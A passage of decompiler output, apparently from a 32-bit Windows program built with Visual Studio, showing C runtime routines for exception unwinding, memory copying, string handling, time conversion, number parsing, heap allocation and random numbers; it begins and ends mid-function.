  local_20 = param_2;
  local_1c = param_6;
  local_18 = param_7;
  local_8 = 0;
  local_14 = 0x403f94;
  local_2c = (undefined4 *)ExceptionList;
  ExceptionList = &local_2c;
  local_34 = param_1;
  local_30 = param_3;
  (*DAT_004122ec)(*param_1,&local_34);
  if (local_8 != 0) {
                    // WARNING: Load size is inaccurate
    *local_2c = *ExceptionList;
  }
  ExceptionList = local_2c;
  return 0;
}



undefined4 FUN_00403fc2(int param_1,int param_2,undefined4 param_3)

{
  undefined4 uVar1;
  
  if ((*(uint *)(param_1 + 4) & 0x66) != 0) {
    *(undefined4 *)(param_2 + 0x24) = 1;
    return 1;
  }
  FUN_00405315(param_1,*(undefined4 *)(param_2 + 0xc),param_3,0,*(undefined4 *)(param_2 + 8),
               *(undefined4 *)(param_2 + 0x10),*(undefined4 *)(param_2 + 0x14),1);
  if (*(int *)(param_2 + 0x24) == 0) {
    FUN_00403e10(param_2,param_1);
  }
                    // WARNING: Could not recover jumptable at 0x0040402c. Too many branches
                    // WARNING: Treating indirect jump as call
  uVar1 = (**(code **)(param_2 + 0x18))();
  return uVar1;
}



int FUN_00404037(uint param_1,int param_2,int param_3,uint *param_4,uint *param_5)

{
  int iVar1;
  int iVar2;
  uint uVar3;
  uint local_8;
  
  iVar2 = param_1;
  local_8 = *(uint *)(param_1 + 0xc);
  iVar1 = *(int *)(param_1 + 0x10);
  uVar3 = local_8;
  param_1 = local_8;
  if (-1 < param_2) {
    do {
      if (uVar3 == 0xffffffff) {
        FUN_00405bb2();
      }
      uVar3 = uVar3 - 1;
      if (((*(int *)(iVar1 + 4 + uVar3 * 0x14) < param_3) &&
          (param_3 <= *(int *)(iVar1 + uVar3 * 0x14 + 8))) || (uVar3 == 0xffffffff)) {
        param_2 = param_2 + -1;
        local_8 = param_1;
        param_1 = uVar3;
      }
    } while (-1 < param_2);
  }
  uVar3 = uVar3 + 1;
  *param_4 = uVar3;
  *param_5 = local_8;
  if ((*(uint *)(iVar2 + 0xc) <= local_8 && local_8 != *(uint *)(iVar2 + 0xc)) || (local_8 < uVar3))
  {
    FUN_00405bb2();
  }
  return iVar1 + uVar3 * 0x14;
}



// Library Function - Single Match
//  __global_unwind2
// 
// Library: Visual Studio

void __global_unwind2(PVOID param_1)

{
  RtlUnwind(param_1,(PVOID)0x4040cc,(PEXCEPTION_RECORD)0x0,(PVOID)0x0);
  return;
}



// Library Function - Single Match
//  __local_unwind2
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release, Visual Studio 2003 Debug, Visual
// Studio 2003 Release

void __local_unwind2(int param_1,int param_2)

{
  int iVar1;
  int iVar2;
  void *pvStack_1c;
  undefined *puStack_18;
  undefined4 local_14;
  int iStack_10;
  
  iStack_10 = param_1;
  puStack_18 = &LAB_004040d4;
  pvStack_1c = ExceptionList;
  ExceptionList = &pvStack_1c;
  while( true ) {
    iVar1 = *(int *)(param_1 + 8);
    iVar2 = *(int *)(param_1 + 0xc);
    if ((iVar2 == -1) || (iVar2 == param_2)) break;
    local_14 = *(undefined4 *)(iVar1 + iVar2 * 0xc);
    *(undefined4 *)(param_1 + 0xc) = local_14;
    if (*(int *)(iVar1 + 4 + iVar2 * 0xc) == 0) {
      __NLG_Notify(0x101);
      (**(code **)(iVar1 + 8 + iVar2 * 0xc))();
    }
  }
  ExceptionList = pvStack_1c;
  return;
}



// Library Function - Single Match
//  __abnormal_termination
// 
// Library: Visual Studio

int __cdecl __abnormal_termination(void)

{
  int iVar1;
  
  iVar1 = 0;
  if (*(undefined **)((int)ExceptionList + 4) == &LAB_004040d4) {
    if (*(int *)((int)ExceptionList + 8) == *(int *)(*(int *)((int)ExceptionList + 0xc) + 0xc)) {
      iVar1 = 1;
    }
  }
  return iVar1;
}



// Library Function - Single Match
//  __NLG_Notify1
// 
// Libraries: Visual Studio 2003 Debug, Visual Studio 2003 Release

void __fastcall __NLG_Notify1(undefined4 param_1)

{
  undefined4 in_EAX;
  undefined4 unaff_EBP;
  
  DAT_0040f7f8 = param_1;
  DAT_0040f7f4 = in_EAX;
  DAT_0040f7fc = unaff_EBP;
  return;
}



// Library Function - Single Match
//  __NLG_Notify
// 
// Libraries: Visual Studio 1998 Debug, Visual Studio 1998 Release, Visual Studio 2003 Debug, Visual
// Studio 2003 Release

void __NLG_Notify(ulong param_1)

{
  undefined4 in_EAX;
  int unaff_EBP;
  
  DAT_0040f7f8 = *(undefined4 *)(unaff_EBP + 8);
  DAT_0040f7f4 = in_EAX;
  DAT_0040f7fc = unaff_EBP;
  return;
}



undefined4 * FUN_004041b0(undefined4 *param_1,undefined4 *param_2,uint param_3)

{
  undefined4 *puVar1;
  uint uVar2;
  uint uVar3;
  
  if ((param_2 < param_1) && (param_1 < (undefined4 *)(param_3 + (int)param_2))) {
    param_2 = (undefined4 *)((param_3 - 4) + (int)param_2);
    puVar1 = (undefined4 *)((param_3 - 4) + (int)param_1);
    if (((uint)puVar1 & 3) == 0) {
      uVar3 = param_3 >> 2;
      if (uVar3 < 8) goto LAB_00404370;
      for (; uVar3 != 0; uVar3 = uVar3 - 1) {
        *puVar1 = *param_2;
        param_2 = param_2 + -1;
        puVar1 = puVar1 + -1;
      }
      switch(param_3 & 3) {
      case 1:
        goto switchD_00404394_caseD_1;
      case 2:
        goto switchD_00404394_caseD_2;
      case 3:
        goto switchD_00404394_caseD_3;
      }
    }
    else {
      switch(param_3) {
      case 0:
        break;
      case 1:
switchD_00404394_caseD_1:
        *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
        return param_1;
      case 2:
switchD_00404394_caseD_2:
        *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
        *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
        return param_1;
      case 3:
switchD_00404394_caseD_3:
        *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
        *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
        *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
        return param_1;
      default:
        param_3 = param_3 - ((uint)puVar1 & 3);
        switch((uint)puVar1 & 3) {
        case 1:
          *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
          param_2 = (undefined4 *)((int)param_2 + -1);
          uVar3 = param_3 >> 2;
          puVar1 = (undefined4 *)((int)puVar1 - 1);
          if (uVar3 < 8) {
LAB_00404370:
                    // WARNING: Could not recover jumptable at 0x00404372. Too many branches
                    // WARNING: Treating indirect jump as call
            puVar1 = (undefined4 *)(*(code *)(&PTR_LAB_00404440)[-uVar3])();
            return puVar1;
          }
          for (; uVar3 != 0; uVar3 = uVar3 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + -1;
            puVar1 = puVar1 + -1;
          }
          switch(param_3 & 3) {
          case 1:
            goto switchD_00404394_caseD_1;
          case 2:
            goto switchD_00404394_caseD_2;
          case 3:
            goto switchD_00404394_caseD_3;
          }
          break;
        case 2:
          *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
          uVar3 = param_3 >> 2;
          *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
          param_2 = (undefined4 *)((int)param_2 + -2);
          puVar1 = (undefined4 *)((int)puVar1 - 2);
          if (uVar3 < 8) goto LAB_00404370;
          for (; uVar3 != 0; uVar3 = uVar3 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + -1;
            puVar1 = puVar1 + -1;
          }
          switch(param_3 & 3) {
          case 1:
            goto switchD_00404394_caseD_1;
          case 2:
            goto switchD_00404394_caseD_2;
          case 3:
            goto switchD_00404394_caseD_3;
          }
          break;
        case 3:
          *(undefined *)((int)puVar1 + 3) = *(undefined *)((int)param_2 + 3);
          *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
          uVar3 = param_3 >> 2;
          *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
          param_2 = (undefined4 *)((int)param_2 + -3);
          puVar1 = (undefined4 *)((int)puVar1 - 3);
          if (uVar3 < 8) goto LAB_00404370;
          for (; uVar3 != 0; uVar3 = uVar3 - 1) {
            *puVar1 = *param_2;
            param_2 = param_2 + -1;
            puVar1 = puVar1 + -1;
          }
          switch(param_3 & 3) {
          case 1:
            goto switchD_00404394_caseD_1;
          case 2:
            goto switchD_00404394_caseD_2;
          case 3:
            goto switchD_00404394_caseD_3;
          }
        }
      }
    }
    return param_1;
  }
  puVar1 = param_1;
  if (((uint)param_1 & 3) == 0) {
    uVar2 = param_3 >> 2;
    if (uVar2 < 8) goto LAB_0040420c;
    for (; uVar2 != 0; uVar2 = uVar2 - 1) {
      *puVar1 = *param_2;
      param_2 = param_2 + 1;
      puVar1 = puVar1 + 1;
    }
    switch(param_3 & 3) {
    case 1:
      goto switchD_00404204_caseD_1;
    case 2:
      goto switchD_00404204_caseD_2;
    case 3:
      goto switchD_00404204_caseD_3;
    }
  }
  else {
    switch(param_3) {
    case 0:
      break;
    case 1:
switchD_00404204_caseD_1:
      *(undefined *)puVar1 = *(undefined *)param_2;
      return param_1;
    case 2:
switchD_00404204_caseD_2:
      *(undefined *)puVar1 = *(undefined *)param_2;
      *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
      return param_1;
    case 3:
switchD_00404204_caseD_3:
      *(undefined *)puVar1 = *(undefined *)param_2;
      *(undefined *)((int)puVar1 + 1) = *(undefined *)((int)param_2 + 1);
      *(undefined *)((int)puVar1 + 2) = *(undefined *)((int)param_2 + 2);
      return param_1;
    default:
      uVar3 = (param_3 - 4) + ((uint)param_1 & 3);
      switch((uint)param_1 & 3) {
      case 1:
        *(undefined *)param_1 = *(undefined *)param_2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        uVar2 = uVar3 >> 2;
        *(undefined *)((int)param_1 + 2) = *(undefined *)((int)param_2 + 2);
        param_2 = (undefined4 *)((int)param_2 + 3);
        puVar1 = (undefined4 *)((int)param_1 + 3);
        if (uVar2 < 8) {
LAB_0040420c:
                    // WARNING: Could not recover jumptable at 0x0040420c. Too many branches
                    // WARNING: Treating indirect jump as call
          puVar1 = (undefined4 *)(*(code *)(&PTR_LAB_0040428c)[uVar2])();
          return puVar1;
        }
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_00404204_caseD_1;
        case 2:
          goto switchD_00404204_caseD_2;
        case 3:
          goto switchD_00404204_caseD_3;
        }
        break;
      case 2:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar3 >> 2;
        *(undefined *)((int)param_1 + 1) = *(undefined *)((int)param_2 + 1);
        param_2 = (undefined4 *)((int)param_2 + 2);
        puVar1 = (undefined4 *)((int)param_1 + 2);
        if (uVar2 < 8) goto LAB_0040420c;
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_00404204_caseD_1;
        case 2:
          goto switchD_00404204_caseD_2;
        case 3:
          goto switchD_00404204_caseD_3;
        }
        break;
      case 3:
        *(undefined *)param_1 = *(undefined *)param_2;
        uVar2 = uVar3 >> 2;
        param_2 = (undefined4 *)((int)param_2 + 1);
        puVar1 = (undefined4 *)((int)param_1 + 1);
        if (uVar2 < 8) goto LAB_0040420c;
        for (; uVar2 != 0; uVar2 = uVar2 - 1) {
          *puVar1 = *param_2;
          param_2 = param_2 + 1;
          puVar1 = puVar1 + 1;
        }
        switch(uVar3 & 3) {
        case 1:
          goto switchD_00404204_caseD_1;
        case 2:
          goto switchD_00404204_caseD_2;
        case 3:
          goto switchD_00404204_caseD_3;
        }
      }
    }
  }
  return param_1;
}



void FUN_004044e5(undefined4 param_1)

{
  uint uVar1;
  int iVar2;
  
  uVar1 = FUN_00405faa(DAT_00413914);
  if (uVar1 < (uint)((int)DAT_00413910 + (4 - DAT_00413914))) {
    iVar2 = FUN_00405faa(DAT_00413914);
    iVar2 = FUN_00405c08(DAT_00413914,iVar2 + 0x10);
    if (iVar2 == 0) {
      return;
    }
    DAT_00413910 = (undefined4 *)(iVar2 + ((int)DAT_00413910 - DAT_00413914 >> 2) * 4);
    DAT_00413914 = iVar2;
  }
  *DAT_00413910 = param_1;
  DAT_00413910 = DAT_00413910 + 1;
  return;
}



int FUN_00404552(undefined4 param_1)

{
  int iVar1;
  
  iVar1 = FUN_004044e5(param_1);
  return (iVar1 != 0) - 1;
}



void FUN_00404593(short *param_1,short *param_2)

{
  short sVar1;
  
  sVar1 = *param_1;
  while (sVar1 != 0) {
    param_1 = param_1 + 1;
    sVar1 = *param_1;
  }
  do {
    sVar1 = *param_2;
    *param_1 = sVar1;
    param_1 = param_1 + 1;
    param_2 = param_2 + 1;
  } while (sVar1 != 0);
  return;
}



void FUN_004045bd(short *param_1,short *param_2)

{
  short sVar1;
  
  sVar1 = *param_2;
  *param_1 = sVar1;
  while( true ) {
    param_1 = param_1 + 1;
    param_2 = param_2 + 1;
    if (sVar1 == 0) break;
    sVar1 = *param_2;
    *param_1 = sVar1;
  }
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

undefined * FUN_004045e2(int *param_1)

{
  int iVar1;
  bool bVar2;
  undefined *puVar3;
  int iVar4;
  int iVar5;
  int *piVar6;
  int *piVar7;
  
  bVar2 = false;
  iVar1 = *param_1;
  if (iVar1 < 0) {
    puVar3 = (undefined *)0x0;
  }
  else {
    iVar4 = iVar1 % 0x7861f80;
    iVar1 = (iVar1 / 0x7861f80) * 4;
    _DAT_004122ac = iVar1 + 0x46;
    iVar5 = iVar4;
    if (0x1e1337f < iVar4) {
      iVar5 = iVar4 + -0x1e13380;
      _DAT_004122ac = iVar1 + 0x47;
      if (0x1e1337f < iVar5) {
        iVar5 = iVar4 + -0x3c26700;
        _DAT_004122ac = iVar1 + 0x48;
        if (iVar5 < 0x1e28500) {
          bVar2 = true;
        }
        else {
          _DAT_004122ac = iVar1 + 0x49;
          iVar5 = iVar4 + -0x5a4ec00;
        }
      }
    }
    _DAT_004122b4 = iVar5 / 0x15180;
    piVar6 = (int *)&DAT_0040f8f8;
    if (!bVar2) {
      piVar6 = &DAT_0040f92c;
    }
    _DAT_004122a8 = 1;
    piVar7 = piVar6;
    while (piVar7 = piVar7 + 1, *piVar7 < _DAT_004122b4) {
      _DAT_004122a8 = _DAT_004122a8 + 1;
    }
    _DAT_004122a8 = _DAT_004122a8 + -1;
    _DAT_004122a4 = _DAT_004122b4 - piVar6[_DAT_004122a8];
    _DAT_004122b0 = (*param_1 / 0x15180 + 4) % 7;
    _DAT_004122a0 = (iVar5 % 0x15180) / 0xe10;
    _DAT_00412298 = (iVar5 % 0x15180) % 0xe10;
    _DAT_0041229c = _DAT_00412298 / 0x3c;
    _DAT_00412298 = _DAT_00412298 % 0x3c;
    _DAT_004122b8 = 0;
    puVar3 = &DAT_00412298;
  }
  return puVar3;
}



// WARNING: Could not reconcile some variable overlaps

void FUN_004046db(undefined4 *param_1)

{
  DWORD DVar1;
  undefined4 uVar2;
  _TIME_ZONE_INFORMATION local_d0;
  _SYSTEMTIME local_24;
  _SYSTEMTIME local_14;
  
  GetLocalTime(&local_14);
  GetSystemTime(&local_24);
  if (local_24.wMinute == DAT_004122d0._2_2_) {
    if (local_24.wHour == (WORD)DAT_004122d0) {
      if (local_24.wDay == DAT_004122cc._2_2_) {
        if (local_24.wMonth == DAT_004122c8._2_2_) {
          if (local_24.wYear == (WORD)DAT_004122c8) goto LAB_00404785;
        }
      }
    }
  }
  DVar1 = GetTimeZoneInformation(&local_d0);
  if (DVar1 == 0xffffffff) {
    DAT_004122c0 = 0xffffffff;
  }
  else if (((DVar1 == 2) && (local_d0.DaylightDate.wMonth != 0)) && (local_d0.DaylightBias != 0)) {
    DAT_004122c0 = 1;
  }
  else {
    DAT_004122c0 = 0;
  }
  DAT_004122c8 = local_24._0_4_;
  DAT_004122cc = local_24._4_4_;
  DAT_004122d0 = local_24._8_4_;
  DAT_004122d4 = local_24._12_4_;
LAB_00404785:
  uVar2 = FUN_0040600b(local_14.wYear,local_14.wMonth,local_14.wDay,local_14.wHour,local_14.wMinute,
                       local_14.wSecond,DAT_004122c0);
  if (param_1 != (undefined4 *)0x0) {
    *param_1 = uVar2;
  }
  return;
}



undefined4 FUN_004047b7(undefined *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  undefined *local_24;
  int local_20;
  undefined *local_1c;
  undefined4 local_18;
  
  local_1c = param_1;
  local_24 = param_1;
  local_18 = 0x42;
  local_20 = 0x7fffffff;
  uVar1 = FUN_004061e2(&local_24,param_2,&stack0x0000000c);
  local_20 = local_20 + -1;
  if (local_20 < 0) {
    FUN_004060cd(0,&local_24);
  }
  else {
    *local_24 = 0;
  }
  return uVar1;
}



int FUN_00404809(short *param_1)

{
  short sVar1;
  short *psVar2;
  
  sVar1 = *param_1;
  psVar2 = param_1 + 1;
  while (sVar1 != 0) {
    sVar1 = *psVar2;
    psVar2 = psVar2 + 1;
  }
  return ((int)psVar2 - (int)param_1 >> 1) + -1;
}



// WARNING: Unable to track spacebase fully for stack

void FUN_00404830(void)

{
  uint in_EAX;
  undefined *puVar1;
  undefined4 unaff_retaddr;
  
  puVar1 = &stack0x00000004;
  if (0xfff < in_EAX) {
    do {
      puVar1 = puVar1 + -0x1000;
      in_EAX = in_EAX - 0x1000;
    } while (0xfff < in_EAX);
  }
  *(undefined4 *)(puVar1 + (-4 - in_EAX)) = unaff_retaddr;
  return;
}



undefined4 FUN_0040485f(undefined *param_1,undefined4 param_2)

{
  undefined4 uVar1;
  undefined *local_24;
  int local_20;
  undefined *local_1c;
  undefined4 local_18;
  
  local_1c = param_1;
  local_24 = param_1;
  local_18 = 0x42;
  local_20 = 0x7fffffff;
  uVar1 = FUN_00406a49(&local_24,param_2,&stack0x0000000c);
  local_20 = local_20 + -1;
  if (local_20 < 0) {
    FUN_004060cd(0,&local_24);
  }
  else {
    *local_24 = 0;
    local_24 = local_24 + 1;
  }
  local_20 = local_20 + -1;
  if (local_20 < 0) {
    FUN_004060cd(0,&local_24);
  }
  else {
    *local_24 = 0;
  }
  return uVar1;
}



int FUN_004048ce(ushort *param_1,ushort *param_2)

{
  ushort uVar1;
  uint in_EAX;
  uint uVar2;
  
  if (DAT_00412348 == 0) {
    do {
      uVar1 = *param_1;
      uVar2 = (uint)uVar1;
      if ((uVar1 < 0x5b) && (0x40 < uVar1)) {
        uVar2 = uVar2 + 0x20;
      }
      uVar1 = *param_2;
      in_EAX = (uint)uVar1;
      if ((uVar1 < 0x5b) && (0x40 < uVar1)) {
        in_EAX = in_EAX + 0x20;
      }
      param_1 = param_1 + 1;
      param_2 = param_2 + 1;
    } while (((short)uVar2 != 0) && ((short)uVar2 == (short)in_EAX));
  }
  else {
    do {
      uVar1 = *param_1;
      param_1 = param_1 + 1;
      uVar2 = FUN_00407268(in_EAX & 0xffff0000 | (uint)uVar1);
      uVar1 = *param_2;
      param_2 = param_2 + 1;
      in_EAX = FUN_00407268(uVar2 & 0xffff0000 | (uint)uVar1);
      if ((short)uVar2 == 0) break;
    } while ((short)uVar2 == (short)in_EAX);
  }
  return (uVar2 & 0xffff) - (in_EAX & 0xffff);
}



void FUN_0040494e(undefined4 param_1,undefined4 param_2,undefined4 param_3)

{
  FUN_00404965(param_1,param_2,param_3,0);
  return;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

uint FUN_00404965(ushort *param_1,ushort **param_2,uint param_3,uint param_4)

{
  ushort *puVar1;
  int iVar2;
  uint uVar3;
  uint uVar4;
  uint unaff_ESI;
  ushort *puVar5;
  uint local_8;
  
  local_8 = 0;
  uVar4 = unaff_ESI & 0xffff0000 | (uint)*param_1;
  puVar1 = param_1;
  while( true ) {
    puVar5 = puVar1 + 1;
    iVar2 = FUN_00407354(uVar4,8);
    if (iVar2 == 0) break;
    uVar4 = uVar4 & 0xffff0000 | (uint)*puVar5;
    puVar1 = puVar5;
  }
  if ((short)uVar4 == 0x2d) {
    param_4 = param_4 | 2;
LAB_004049a0:
    uVar4 = uVar4 & 0xffff0000 | (uint)*puVar5;
    puVar5 = puVar1 + 2;
  }
  else if ((short)uVar4 == 0x2b) goto LAB_004049a0;
  if ((((int)param_3 < 0) || (param_3 == 1)) || (0x24 < (int)param_3)) {
    if (param_2 != (ushort **)0x0) {
      *param_2 = param_1;
    }
    return 0;
  }
  if (param_3 == 0) {
    if ((short)uVar4 != 0x30) {
      param_3 = 10;
      goto LAB_00404a08;
    }
    if ((*puVar5 != 0x78) && (*puVar5 != 0x58)) {
      param_3 = 8;
      goto LAB_00404a08;
    }
    param_3 = 0x10;
  }
  if (((param_3 == 0x10) && ((short)uVar4 == 0x30)) && ((*puVar5 == 0x78 || (*puVar5 == 0x58)))) {
    uVar4 = uVar4 & 0xffff0000 | (uint)puVar5[1];
    puVar5 = puVar5 + 2;
  }
LAB_00404a08:
  uVar3 = (uint)(0xffffffff / (ulonglong)param_3);
  do {
    iVar2 = FUN_00407354(uVar4,4);
    if (iVar2 == 0) {
      iVar2 = FUN_00407354(uVar4,0x103);
      if (iVar2 == 0) {
LAB_00404a78:
        puVar5 = puVar5 + -1;
        if ((param_4 & 8) == 0) {
          if (param_2 != (ushort **)0x0) {
            puVar5 = param_1;
          }
          local_8 = 0;
        }
        else if (((param_4 & 4) != 0) ||
                (((param_4 & 1) == 0 &&
                 ((((param_4 & 2) != 0 && (0x80000000 < local_8)) ||
                  (((param_4 & 2) == 0 && (0x7fffffff < local_8)))))))) {
          _DAT_004122f4 = 0x22;
          if ((param_4 & 1) == 0) {
            local_8 = ((param_4 & 2) != 0) + 0x7fffffff;
          }
          else {
            local_8 = 0xffffffff;
          }
        }
        if (param_2 != (ushort **)0x0) {
          *param_2 = puVar5;
        }
        if ((param_4 & 2) == 0) {
          return local_8;
        }
        return -local_8;
      }
      uVar4 = FUN_004072dd(uVar4);
      uVar4 = (uVar4 & 0xffff) - 0x37;
    }
    else {
      uVar4 = (uVar4 & 0xffff) - 0x30;
    }
    if (param_3 <= uVar4) goto LAB_00404a78;
    if ((local_8 < uVar3) ||
       ((local_8 == uVar3 && (uVar4 <= (uint)(0xffffffff % (ulonglong)param_3))))) {
      local_8 = local_8 * param_3 + uVar4;
      param_4 = param_4 | 8;
    }
    else {
      param_4 = param_4 | 0xc;
    }
    uVar4 = local_8 & 0xffff0000 | (uint)*puVar5;
    puVar5 = puVar5 + 1;
  } while( true );
}



void FUN_00404b0a(LPVOID param_1)

{
  LPVOID lpMem;
  int iVar1;
  undefined4 local_8;
  
  lpMem = param_1;
  if (param_1 != (LPVOID)0x0) {
    if (DAT_00413904 == 3) {
      iVar1 = FUN_004075c0(param_1);
      if (iVar1 != 0) {
        FUN_004075eb(iVar1);
        return;
      }
    }
    else if ((DAT_00413904 == 2) && (iVar1 = FUN_0040831b(param_1,&local_8,&param_1), iVar1 != 0)) {
      FUN_00408372(local_8,param_1,iVar1);
      return;
    }
    HeapFree(DAT_00413900,0,lpMem);
  }
  return;
}



// Library Function - Single Match
//  _malloc
// 
// Library: Visual Studio 2003 Release

void * __cdecl _malloc(size_t _Size)

{
  void *pvVar1;
  
  pvVar1 = __nh_malloc(_Size,DAT_00412364);
  return pvVar1;
}



// Library Function - Single Match
//  __nh_malloc
// 
// Library: Visual Studio 2003 Release

void * __cdecl __nh_malloc(size_t _Size,int _NhFlag)

{
  void *pvVar1;
  int iVar2;
  
  if (_Size < 0xffffffe1) {
    do {
      pvVar1 = (void *)FUN_00404bb1(_Size);
      if (pvVar1 != (void *)0x0) {
        return pvVar1;
      }
      if (_NhFlag == 0) {
        return (void *)0x0;
      }
      iVar2 = FUN_0040878c(_Size);
    } while (iVar2 != 0);
  }
  return (void *)0x0;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address

void FUN_00404bb1(uint param_1)

{
  int iVar1;
  SIZE_T dwBytes;
  
  if (DAT_00413904 == 3) {
    if ((param_1 <= _DAT_004138fc) && (iVar1 = FUN_00407914(param_1), iVar1 != 0)) {
      return;
    }
  }
  else if (DAT_00413904 == 2) {
    if (param_1 == 0) {
      dwBytes = 0x10;
    }
    else {
      dwBytes = param_1 + 0xf & 0xfffffff0;
    }
    if ((dwBytes <= _DAT_00411994) && (iVar1 = FUN_004083b7(dwBytes >> 4), iVar1 != 0)) {
      return;
    }
    goto LAB_00404c14;
  }
  if (param_1 == 0) {
    param_1 = 1;
  }
  dwBytes = param_1 + 0xf & 0xfffffff0;
LAB_00404c14:
  HeapAlloc(DAT_00413900,0,dwBytes);
  return;
}



short * FUN_00404c25(short *param_1,short *param_2)

{
  short *psVar1;
  
  do {
    if (*param_1 == 0) {
      return (short *)0x0;
    }
    psVar1 = param_2;
    do {
      if ((*psVar1 == 0) || (*(short *)(((int)param_1 - (int)param_2) + (int)psVar1) != *psVar1))
      break;
      psVar1 = psVar1 + 1;
    } while (*(short *)(((int)param_1 - (int)param_2) + (int)psVar1) != 0);
    if (*psVar1 == 0) {
      return param_1;
    }
    param_1 = param_1 + 1;
  } while( true );
}



void FUN_00404c66(undefined4 param_1)

{
  DAT_0040f800 = param_1;
  return;
}



uint FUN_00404c70(void)

{
  DAT_0040f800 = DAT_0040f800 * 0x343fd + 0x269ec3;
  return DAT_0040f800 >> 0x10 & 0x7fff;
}



undefined4 FUN_00404c8e(FILE *param_1)

{
  int iVar1;
  undefined4 uVar2;
  
  uVar2 = 0xffffffff;
  if ((param_1->_flag & 0x40U) == 0) {
    if ((param_1->_flag & 0x83U) != 0) {
      uVar2 = FUN_00408e94(param_1);
      __freebuf(param_1);
      iVar1 = FUN_00408d7b(param_1->_file);
      if (iVar1 < 0) {
        uVar2 = 0xffffffff;
      }
      else if (param_1->_tmpfname != (char *)0x0) {
        FUN_00404b0a(param_1->_tmpfname);
        param_1->_tmpfname = (char *)0x0;
      }
    }
  }
  else {
    uVar2 = 0xffffffff;
  }
  param_1->_flag = 0;
  return uVar2;
}



int FUN_00404ce4(byte *param_1)

{
  uint uVar1;
  uint uVar2;
  int iVar3;
  uint uVar4;
  byte *pbVar5;
  
  while( true ) {
    if (DAT_00411ba4 < 2) {
      uVar1 = (byte)PTR_DAT_00411998[(uint)*param_1 * 2] & 8;
    }
    else {
      uVar1 = FUN_004087a7(*param_1,8);
    }
    if (uVar1 == 0) break;
    param_1 = param_1 + 1;
  }
  uVar1 = (uint)*param_1;
  pbVar5 = param_1 + 1;
  if ((uVar1 == 0x2d) || (uVar4 = uVar1, uVar1 == 0x2b)) {
    uVar4 = (uint)*pbVar5;
    pbVar5 = param_1 + 2;
  }
  iVar3 = 0;
  while( true ) {
    if (DAT_00411ba4 < 2) {
      uVar2 = (byte)PTR_DAT_00411998[uVar4 * 2] & 4;
    }
    else {
      uVar2 = FUN_004087a7(uVar4,4);
    }
    if (uVar2 == 0) break;
    iVar3 = (uVar4 - 0x30) + iVar3 * 10;
    uVar4 = (uint)*pbVar5;
    pbVar5 = pbVar5 + 1;
  }
  if (uVar1 == 0x2d) {
    iVar3 = -iVar3;
  }
  return iVar3;
}



void FUN_00404d6f(undefined4 param_1)

{
  FUN_00404ce4(param_1);
  return;
}



uint * FUN_00404d80(uint *param_1,char *param_2)

{
  char *pcVar1;
  char *pcVar2;
  char cVar3;
  uint uVar4;
  uint *puVar5;
  char cVar6;
  uint uVar7;
  char *pcVar8;
  uint uVar9;
  uint *puVar10;
  
  cVar3 = *param_2;
  if (cVar3 == '\0') {
    return param_1;
  }
  if (param_2[1] == '\0') {
    uVar4 = (uint)param_1 & 3;
    while (uVar4 != 0) {
      if (*(char *)param_1 == cVar3) {
        return param_1;
      }
      if (*(char *)param_1 == '\0') {
        return (uint *)0x0;
      }
      uVar4 = (uint)(uint *)((int)param_1 + 1) & 3;
      param_1 = (uint *)((int)param_1 + 1);
    }
    while( true ) {
      while( true ) {
        uVar4 = *param_1;
        uVar9 = uVar4 ^ CONCAT22(CONCAT11(cVar3,cVar3),CONCAT11(cVar3,cVar3));
        uVar7 = uVar4 ^ 0xffffffff ^ uVar4 + 0x7efefeff;
        puVar10 = param_1 + 1;
        if (((uVar9 ^ 0xffffffff ^ uVar9 + 0x7efefeff) & 0x81010100) != 0) break;
        param_1 = puVar10;
        if ((uVar7 & 0x81010100) != 0) {
          if ((uVar7 & 0x1010100) != 0) {
            return (uint *)0x0;
          }
          if ((uVar4 + 0x7efefeff & 0x80000000) == 0) {
            return (uint *)0x0;
          }
        }
      }
      uVar4 = *param_1;
      if ((char)uVar4 == cVar3) {
        return param_1;
      }
      if ((char)uVar4 == '\0') {
        return (uint *)0x0;
      }
      cVar6 = (char)(uVar4 >> 8);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 1);
      }
      if (cVar6 == '\0') break;
      cVar6 = (char)(uVar4 >> 0x10);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 2);
      }
      if (cVar6 == '\0') {
        return (uint *)0x0;
      }
      cVar6 = (char)(uVar4 >> 0x18);
      if (cVar6 == cVar3) {
        return (uint *)((int)param_1 + 3);
      }
      param_1 = puVar10;
      if (cVar6 == '\0') {
        return (uint *)0x0;
      }
    }
    return (uint *)0x0;
  }
  do {
    cVar6 = *(char *)param_1;
    do {
      while (puVar10 = param_1, param_1 = (uint *)((int)puVar10 + 1), cVar6 != cVar3) {
        if (cVar6 == '\0') {
          return (uint *)0x0;
        }
        cVar6 = *(char *)param_1;
      }
      cVar6 = *(char *)param_1;
      pcVar8 = param_2;
